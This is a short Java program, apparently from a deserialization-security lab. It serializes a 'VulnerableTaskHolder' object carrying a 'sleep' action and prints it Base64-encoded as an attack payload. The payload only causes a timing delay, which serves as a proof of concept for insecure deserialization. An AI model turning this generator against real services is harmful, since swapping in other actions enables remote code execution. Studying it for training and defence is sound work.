import java.io.*;
import java.util.Base64;

class VulnerableTaskHolder implements Serializable {
    private static final long serialVersionUID = 5L;
    private String taskAction;
    private String taskName;
    private long taskTime;
    
    public VulnerableTaskHolder(String action, String name, long time) {
        this.taskAction = action;
        this.taskName = name;
        this.taskTime = time;
    }
}

public class GenerateV5 {
    public static void main(String[] args) {
        try {
            VulnerableTaskHolder task = new VulnerableTaskHolder("sleep", "DelayTask", 5000);
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(bos);
            oos.writeObject(task);
            oos.close();
            String payload = Base64.getEncoder().encodeToString(bos.toByteArray());
            System.out.println(payload);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
